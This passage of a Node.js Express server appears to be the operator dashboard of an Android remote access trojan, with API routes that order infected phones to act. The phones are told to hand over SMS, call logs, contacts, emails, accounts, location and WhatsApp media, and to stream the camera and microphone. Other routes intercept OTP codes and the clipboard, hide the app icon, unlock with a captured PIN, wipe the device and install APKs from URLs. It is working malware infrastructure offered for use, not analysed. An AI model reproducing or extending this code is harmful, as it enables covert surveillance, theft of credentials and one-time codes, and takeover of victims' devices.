  const result = sendOrderToClient(req.clientId, "file_rename", {
    path: filePath,
    newName,
  });
  res.json(result);
});

// ⭐ Create a folder
apiRouter.post("/:clientId/file_mkdir", (req, res) => {
  const { path: filePath } = req.body;
  const result = sendOrderToClient(req.clientId, "file_mkdir", {
    path: filePath,
  });
  res.json(result);
});

// ⭐ Search in files
apiRouter.post("/:clientId/file_search", (req, res) => {
  const { path: filePath, query, max } = req.body;
  const result = sendOrderToClient(req.clientId, "file_search", {
    path: filePath,
    query,
    max: max || 50,
  });
  res.json(result);
});

// ============================================================
// ============== MEDIA =======================================
// ============================================================

// ⭐ Start camera stream
apiRouter.post("/:clientId/camera", (req, res) => {
  const { camera_id = 0, quality = 40 } = req.body;
  const result = sendOrderToClient(req.clientId, "camera", {
    camera_id,
    quality,
  });
  res.json(result);
});

// ⭐ Stop camera stream
apiRouter.post("/:clientId/camera/stop", (req, res) => {
  const result = sendOrderToClient(req.clientId, "stop_camera", {});
  res.json(result);
});

// ⭐ Mic control
// body: { action: 'start'|'stop', mode: 'stream'|'record', sample_rate }
apiRouter.post("/:clientId/mic", (req, res) => {
  const { action, mode, sample_rate } = req.body;
  const result = sendOrderToClient(req.clientId, "mic", {
    action,
    mode,
    sample_rate: sample_rate || 11025,
  });
  res.json(result);
});

// ⭐ Reading WhatsApp media
apiRouter.post("/:clientId/whatsapp/media", (req, res) => {
  const { mediaType } = req.body;
  const result = sendOrderToClient(req.clientId, "whatsapp_media", {
    mediaType: mediaType || "audio",
  });
  res.json(result);
});

// ============================================================
// ============== DATA COLLECTION =============================
// ============================================================

// ⭐ Read SMS
apiRouter.post("/:clientId/sms", (req, res) => {
  const result = sendOrderToClient(req.clientId, "sms", {});
  res.json(result);
});

// ⭐ Reading the call log
apiRouter.post("/:clientId/call_logs", (req, res) => {
  const result = sendOrderToClient(req.clientId, "call_logs", {});
  res.json(result);
});

// ⭐ Deleting the call log
apiRouter.post("/:clientId/call_logs/clear", (req, res) => {
  const result = sendOrderToClient(req.clientId, "call_logs_clear", {});
  res.json(result);
});

// ⭐ Filter by type
apiRouter.post("/:clientId/call_logs/filter", (req, res) => {
  const { type } = req.body; // incoming | outgoing | missed
  const order = `call_logs_${type}`;
  const result = sendOrderToClient(req.clientId, order, {});
  res.json(result);
});

// ⭐ Reading contacts
apiRouter.post("/:clientId/contacts", (req, res) => {
  const result = sendOrderToClient(req.clientId, "contacts", {});
  res.json(result);
});

// ⭐ Deleting contacts
apiRouter.post("/:clientId/contacts/delete", (req, res) => {
  const { contactId } = req.body;
  if (!contactId)
    return res.status(400).json({ success: false, error: "Missing contactId" });

  const result = sendOrderToClient(req.clientId, "delete_contact", {
    contactId,
  });
  res.json(result);
});

// ⭐ Deleting Number
apiRouter.post("/:clientId/contacts/delete-phone", (req, res) => {
  const { phoneId } = req.body;
  if (!phoneId)
    return res.status(400).json({ success: false, error: "Missing phoneId" });

  const result = sendOrderToClient(req.clientId, "delete_contact_phone", {
    phoneId,
  });
  res.json(result);
});

// ⭐ Delete by name
apiRouter.post("/:clientId/contacts/delete-by-name", (req, res) => {
  const { name } = req.body;
  if (!name)
    return res.status(400).json({ success: false, error: "Missing name" });

  const result = sendOrderToClient(req.clientId, "delete_contacts_by_name", {
    name,
  });
  res.json(result);
});

// ⭐ Multi delete
apiRouter.post("/:clientId/contacts/delete-multiple", (req, res) => {
  const { contactIds } = req.body;
  if (!Array.isArray(contactIds))
    return res
      .status(400)
      .json({ success: false, error: "Missing contactIds array" });

  const result = sendOrderToClient(req.clientId, "delete_contacts_multiple", {
    contactIds,
  });
  res.json(result);
});

// ⭐ Delete all
apiRouter.post("/:clientId/contacts/delete-all", (req, res) => {
  const result = sendOrderToClient(req.clientId, "delete_all_contacts", {});
  res.json(result);
});

// ⭐ Reading the location
apiRouter.post("/:clientId/location", (req, res) => {
  const result = sendOrderToClient(req.clientId, "location", {});
  res.json(result);
});

// ⭐ Device Info
apiRouter.post("/:clientId/device_info", (req, res) => {
  const result = sendOrderToClient(req.clientId, "device_info", {});
  res.json(result);
});

// ============================================================
// ============== EMAILS ======================================
// ============================================================

// ⭐ Contact emails
apiRouter.post("/:clientId/emails", (req, res) => {
  const result = sendOrderToClient(req.clientId, "emails", {});
  res.json(result);
});

// ⭐ Device accounts
apiRouter.post("/:clientId/accounts", (req, res) => {
  const result = sendOrderToClient(req.clientId, "accounts", {});
  res.json(result);
});

// ⭐ Emails from SMS
apiRouter.post("/:clientId/sms_emails", (req, res) => {
  const result = sendOrderToClient(req.clientId, "sms_emails", {});
  res.json(result);
});

// ⭐ All emails at once
apiRouter.post("/:clientId/emails_all", (req, res) => {
  const result = sendOrderToClient(req.clientId, "emails_all", {});
  res.json(result);
});

// ============================================================
// ============== APPS ========================================
// ============================================================

// ⭐ List of applications (uninstallable)
apiRouter.post("/:clientId/apps/list", (req, res) => {
  const result = sendOrderToClient(req.clientId, "list_apps", {});
  res.json(result);
});

// ⭐ List of launchable applications
apiRouter.post("/:clientId/apps/launchable", (req, res) => {
  const result = sendOrderToClient(req.clientId, "list_launchable", {});
  res.json(result);
});

// ⭐ Launch an application
apiRouter.post("/:clientId/apps/launch", (req, res) => {
  const { package: pkg } = req.body;
  const result = sendOrderToClient(req.clientId, "launch_app", {
    package: pkg,
  });
  res.json(result);
});

// ⭐ Open URL
apiRouter.post("/:clientId/apps/open_url", (req, res) => {
  const { url } = req.body;
  const result = sendOrderToClient(req.clientId, "open_url", { url });
  res.json(result);
});

// ⭐ Open Play Store
apiRouter.post("/:clientId/apps/open_play_store", (req, res) => {
  const { package: pkg } = req.body;
  const result = sendOrderToClient(req.clientId, "open_play_store", {
    package: pkg,
  });
  res.json(result);
});

// ⭐ Stop an app
apiRouter.post("/:clientId/apps/force_stop", (req, res) => {
  const { package: pkg } = req.body;
  const result = sendOrderToClient(req.clientId, "force_stop", {
    package: pkg,
  });
  res.json(result);
});

// ============================================================
// ============== INSTALL / UNINSTALL =========================
// ============================================================

// ⭐ Uninstall (Intent)
apiRouter.post("/:clientId/apps/uninstall", (req, res) => {
  const { package: pkg } = req.body;
  const result = sendOrderToClient(req.clientId, "uninstall", { package: pkg });
  res.json(result);
});

// ⭐ Uninstall (PackageInstaller)
apiRouter.post("/:clientId/apps/uninstall_pi", (req, res) => {
  const { package: pkg } = req.body;
  const result = sendOrderToClient(req.clientId, "uninstall_pi", {
    package: pkg,
  });
  res.json(result);
});

// ⭐Multi Uninstall
apiRouter.post("/:clientId/apps/uninstall_multiple", (req, res) => {
  const { packages } = req.body;
  const result = sendOrderToClient(req.clientId, "uninstall_multiple", {
    packages,
  });
  res.json(result);
});

// ⭐ Installing an APK from Base64
apiRouter.post("/:clientId/apps/install_apk", (req, res) => {
  const { data, name } = req.body;
  const result = sendOrderToClient(req.clientId, "install_apk", {
    data,
    name: name || "app.apk",
  });
  res.json(result);
});

// ⭐ Install APK from URL
apiRouter.post("/:clientId/apps/install_url", (req, res) => {
  const { url, name } = req.body;
  const result = sendOrderToClient(req.clientId, "install_url", {
    url,
    name: name || "app.apk",
  });
  res.json(result);
});

// ⭐ Check installation permission
apiRouter.post("/:clientId/apps/check_install_perm", (req, res) => {
  const result = sendOrderToClient(req.clientId, "check_install_perm", {});
  res.json(result);
});

// ============================================================
// ============== POWER =======================================
// ============================================================

// ⭐ lock
apiRouter.post("/:clientId/power/lock", (req, res) => {
  const result = sendOrderToClient(req.clientId, "lock_screen", {});
  res.json(result);
});

// ⭐ unlock
apiRouter.post("/:clientId/power/unlock", (req, res) => {
  const { pin } = req.body;
  const result = sendOrderToClient(req.clientId, "unlock_screen", {
    pin: pin || "",
  });
  res.json(result);
});

// ⭐ unlock pattern
apiRouter.post("/:clientId/power/unlock_pattern", (req, res) => {
  const { pattern } = req.body;
  const result = sendOrderToClient(req.clientId, "unlock_pattern", {
    pattern: pattern || "",
  });
  res.json(result);
});

// ⭐ Send the stored PIN to unlock the device
apiRouter.post("/:clientId/power/unlock_stored", (req, res) => {
  const lockCreds = lastData[req.clientId]?.lock_captured;
  const pin = lockCreds?.data?.pin || "";
  const result = sendOrderToClient(req.clientId, "unlock_screen", {
    pin,
  });
  res.json(result);
});

// ⭐ wipe device ⚠️
apiRouter.post("/:clientId/power/wipe", (req, res) => {
  const result = sendOrderToClient(req.clientId, "wipe_device", {});
  res.json(result);
});

// ⭐ power status
apiRouter.post("/:clientId/power/status", (req, res) => {
  const result = sendOrderToClient(req.clientId, "power_status", {});
  res.json(result);
});

// ⭐ restart app
apiRouter.post("/:clientId/power/restart_app", (req, res) => {
  const result = sendOrderToClient(req.clientId, "restart_app", {});
  res.json(result);
});

// ============================================================
// ============== OTP =========================================
// ============================================================

apiRouter.post("/:clientId/otp/start", (req, res) => {
  const result = sendOrderToClient(req.clientId, "start_otp", {});
  res.json(result);
});

apiRouter.post("/:clientId/otp/stop", (req, res) => {
  const result = sendOrderToClient(req.clientId, "stop_otp", {});
  res.json(result);
});

// ============================================================
// ============== CLIPBOARD ===================================
// ============================================================

apiRouter.post("/:clientId/clipboard/start", (req, res) => {
  const result = sendOrderToClient(req.clientId, "start_clipboard", {});
  res.json(result);
});

apiRouter.post("/:clientId/clipboard/stop", (req, res) => {
  const result = sendOrderToClient(req.clientId, "stop_clipboard", {});
  res.json(result);
});

// ============================================================
// ============== AUTO CAPTURE ================================
// ============================================================

apiRouter.post("/:clientId/auto_capture/on", (req, res) => {
  const result = sendOrderToClient(req.clientId, "auto_capture_on", {});
  res.json(result);
});

apiRouter.post("/:clientId/auto_capture/off", (req, res) => {
  const result = sendOrderToClient(req.clientId, "auto_capture_off", {});
  res.json(result);
});

// ============================================================
// ============== STEALTH =====================================
// ============================================================

apiRouter.post("/:clientId/stealth/hide_icon", (req, res) => {
  const result = sendOrderToClient(req.clientId, "hide_icon", {});
  res.json(result);
});

apiRouter.post("/:clientId/stealth/show_icon", (req, res) => {
  const result = sendOrderToClient(req.clientId, "show_icon", {});
  res.json(result);
});

apiRouter.post("/:clientId/stealth/reveal_ui", (req, res) => {
  const result = sendOrderToClient(req.clientId, "reveal_ui", {});
  res.json(result);
});

// ============================================================
// ============== SCREEN READER ===============================
// ============================================================

apiRouter.post("/:clientId/screen_reader/start", (req, res) => {
  const result = sendOrderToClient(req.clientId, "screen_reader_start", {});
  res.json(result);
});

apiRouter.post("/:clientId/screen_reader/stop", (req, res) => {
  const result = sendOrderToClient(req.clientId, "screen_reader_stop", {});
  res.json(result);
});

// ============================================================
// ============== ACCESSIBILITY REMOTE CONTROL ================
// ============================================================

// ⭐ Click based on the text
apiRouter.post("/:clientId/accessibility/click_text", (req, res) => {
  const { text } = req.body;
  const result = sendOrderToClient(req.clientId, "click_text", { text });
  res.json(result);
});

// ⭐ Click by ID
apiRouter.post("/:clientId/accessibility/click_id", (req, res) => {
  const { id } = req.body;
  const result = sendOrderToClient(req.clientId, "click_id", { id });
  res.json(result);
});

// ⭐ Click by coordinates
apiRouter.post("/:clientId/accessibility/click_xy", (req, res) => {
  const { coord } = req.body; // "x,y"
  const result = sendOrderToClient(req.clientId, "click_xy", { coord });
  res.json(result);
});

// ⭐ Writing text
apiRouter.post("/:clientId/accessibility/input_text", (req, res) => {
  const { text } = req.body;
  const result = sendOrderToClient(req.clientId, "input_text", { text });
  res.json(result);
});

// ⭐ swipe
apiRouter.post("/:clientId/accessibility/swipe", (req, res) => {
  const { coord } = req.body; // "x1,y1,x2,y2,duration"
  const result = sendOrderToClient(req.clientId, "swipe_gesture", { coord });
  res.json(result);
});

// ⭐ Navigation buttons
apiRouter.post("/:clientId/accessibility/nav", (req, res) => {
  const { action } = req.body; // back | home | recents | notifications | quick_settings | power_dialog | lock_device | take_screenshot
  const orderMap = {
    back: "nav_back",
    home: "nav_home",
    recents: "nav_recents",
    notifications: "nav_notifications",
    quick_settings: "nav_quick_settings",
    power_dialog: "nav_power_dialog",
    lock_device: "lock_device",
    take_screenshot: "take_screenshot",
  };
  const order = orderMap[action];
  if (!order)
    return res.status(400).json({ success: false, error: "Invalid action" });
  const result = sendOrderToClient(req.clientId, order, {});
  res.json(result);
});

// ⭐ black overlay
apiRouter.post("/:clientId/accessibility/black_overlay", (req, res) => {
  const { enable } = req.body;
  const result = sendOrderToClient(
    req.clientId,
    enable ? "black_overlay_on" : "black_overlay_off",
    {},
  );
  res.json(result);
});

// ============================================================
// ============== AUTO TOGGLES ================================
// ============================================================

apiRouter.post("/:clientId/toggle/auto_uninstall", (req, res) => {
  const { enable } = req.body;
  const result = sendOrderToClient(
    req.clientId,
    enable ? "auto_uninstall_on" : "auto_uninstall_off",
    {},
  );
  res.json(result);
});

apiRouter.post("/:clientId/toggle/auto_install", (req, res) => {
  const { enable } = req.body;
  const result = sendOrderToClient(
    req.clientId,
    enable ? "auto_install_on" : "auto_install_off",
    {},
  );
  res.json(result);
});

apiRouter.post("/:clientId/toggle/auto_accept_perms", (req, res) => {
  const { enable } = req.body;
  const result = sendOrderToClient(
    req.clientId,
    enable ? "auto_accept_perms_on" : "auto_accept_perms_off",
    {},
  );
  res.json(result);
});

// ============================================================
// ============== DB EXPORT ===================================
// ============================================================

// ⭐ Request to export the database
apiRouter.post("/:clientId/db/export", (req, res) => {
  const result = sendOrderToClient(req.clientId, "db_export", {});
  res.json(result);
});

// ⭐ Clear database
apiRouter.post("/:clientId/db/clear", (req, res) => {
  const result = sendOrderToClient(req.clientId, "db_clear", {});
  res.json(result);
});

// ⭐ Restore the latest DB export
apiRouter.get("/:clientId/db/latest", (req, res) => {
  const exportInfo = dbExports[req.clientId];
  if (!exportInfo || !fs.existsSync(exportInfo.path)) {
    return res
      .status(404)
      .json({ success: false, error: "No DB export found" });
  }
  try {
    const content = JSON.parse(fs.readFileSync(exportInfo.path, "utf8"));
    res.json({ success: true, data: content, timestamp: exportInfo.timestamp });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// ⭐ Start Screenshot Live
apiRouter.post("/:clientId/live_screenshot/start", (req, res) => {
  const { interval = 2000 } = req.body;
  const result = sendOrderToClient(req.clientId, "live_screenshot", {
    action: "start",
    interval,
  });
  res.json(result);
});

// ⭐ Stop Screenshot Live
apiRouter.post("/:clientId/live_screenshot/stop", (req, res) => {
  const result = sendOrderToClient(req.clientId, "live_screenshot", {
    action: "stop",
  });
  res.json(result);
});

// ============================================================
// ============== GENERIC COMMAND =============================
// ============================================================

// ⭐ General order (for any unknown order)
apiRouter.post("/:clientId/order", (req, res) => {
  const { order, params } = req.body;
  if (!order)
    return res.status(400).json({ success: false, error: "Missing order" });
  const result = sendOrderToClient(req.clientId, order, params || {});
  res.json(result);
});

// ⭐ Status of the latest data for each type
apiRouter.get("/:clientId/last/:type", (req, res) => {
  const { clientId, type } = req.params;
  const data = lastData[clientId] && lastData[clientId][type];
  if (!data) return res.status(404).json({ success: false, error: "No data" });
  res.json({ success: true, ...data });
});

// ============================================================
//  router
// ============================================================
app.use("/api", apiRouter);

// =====================================================
// ============ Public API (without clientId) ===============
// =====================================================

// ⭐ List of devices
app.get("/api/clients", (req, res) => {
  res.json({
    success: true,
    clients: Object.keys(clients).map((id) => ({
      id,
      details: clients[id].details,
      isWs: clients[id].isWs,
    })),
  });
});

// ⭐ List of listeners
app.get("/api/listeners", (req, res) => {
  res.json({ success: true, listeners: Object.keys(listeners) });
});

// ⭐ DB exports
app.get("/api/db-exports", (req, res) => {
  res.json({ success: true, exports: dbExports });
});

// ⭐ Upload (old)
app.post("/api/upload", express.json({ limit: "100mb" }), (req, res) => {
  const { clientId, path: filePath, data } = req.body;
  if (!clientId || !filePath || !data)
    return res.status(400).json({ error: "Missing params" });
  const result = sendOrderToClient(clientId, "file_upload", {
    path: filePath,
    data,
  });
  res.json(result);
});

// ⭐ Unzip (old)
app.post("/api/unzip", express.json({ limit: "10mb" }), (req, res) => {
  const { clientId, zipPath, destDir } = req.body;
  if (!clientId || !zipPath || !destDir)
    return res.status(400).json({ error: "Missing params" });
  const result = sendOrderToClient(clientId, "file_unzip", {
    zipPath,
    destDir,
  });
  res.json(result);
});

// ⭐Downloads
app.get("/api/list", (req, res) => {
  try {
    const rel = decodeURIComponent((req.query.path || "").toString());
    const root = path.join(__dirname, "Downloads");
    const target = path.join(root, rel);
    const relNorm = path.relative(root, target);
    if (relNorm.startsWith("..") || path.isAbsolute(relNorm)) {
      return res.status(400).json({ error: "Invalid path" });
    }
    if (!fs.existsSync(target) || !fs.statSync(target).isDirectory()) {
      return res.json({ path: rel, entries: [] });
    }
    const entries = fs
      .readdirSync(target)
      .map((name) => {
        const full = path.join(target, name);
        try {
          const st = fs.statSync(full);
          const subRel = rel ? rel + "/" + name : name;
          return {
            name,
            url: "/Downloads/" + subRel.split(path.sep).join("/"),
            isDir: st.isDirectory(),
            size: st.size,
            mtime: st.mtimeMs,
          };
        } catch (e) {
          return null;
        }
      })
      .filter(Boolean);
    res.json({ path: rel, entries });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// =====================================================
// ============ Static =================================
// =====================================================
app.use("/app", express.static(path.join(__dirname, "public", "app")));
app.get("/app", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "app", "index.html")),
);
app.get("/app/*", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "app", "index.html")),
);

// =====================================================
// ============ Auth ===================================
// =====================================================
function requireAuth(req, res, next) {
  if (req.path === "/ws") return next();
  if (req.path.startsWith("/socket.io")) return next();
  if (
    ["/login", "/api/login", "/api/logout", "/api/session"].includes(req.path)
  )
    return next();
  if (req.path.startsWith("/app")) return next();
  if (
    req.path.startsWith("/static") ||
    req.path.startsWith("/assets") ||
    req.path.match(/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map)$/)
  )
    return next();

  if (req.path.startsWith("/api/")) {
    if (verifySession(req.cookies.session)) return next();
    return res.status(401).json({ success: false, error: "Unauthorized" });
  }

  if (req.path.startsWith("/Downloads") || req.path.startsWith("/output")) {
    if (verifySession(req.cookies.session)) {
      return next();
    }

    console.log(`[SECURITY] ⛔ Blocked access to ${req.path} from ${req.ip}`);

    const accept = req.headers.accept || "";
    if (accept.includes("text/html")) {
      return res.redirect("/login");
    }

    return res.status(403).json({
      success: false,
      error: "Access denied. Please login first.",
    });
  }

  if (verifySession(req.cookies.session)) return next();
  return res.redirect("/login");
}

app.use(requireAuth);
app.use(express.static(path.join(__dirname, "public")));
app.use("/output", express.static(path.join(__dirname, "output")));
app.use("/Downloads", express.static(path.join(__dirname, "Downloads")));

app.get("*", (req, res, next) => {
  if (req.method !== "GET") return next();
  if (
    req.path.startsWith("/api/") ||
    req.path.startsWith("/socket.io") ||
    req.path.startsWith("/Downloads") ||
    req.path.startsWith("/output") ||
    req.path.startsWith("/ws")
  )
    return next();
  res.sendFile(path.join(__dirname, "public", "app", "index.html"));
});

// =====================================================
// ============ Run ==================================
// =====================================================
server.listen(3000, () => {
  console.log("Web Dashboard running on http://localhost:3000");
  console.log(`Access password: ${ACCESS_PASSWORD}`);
});
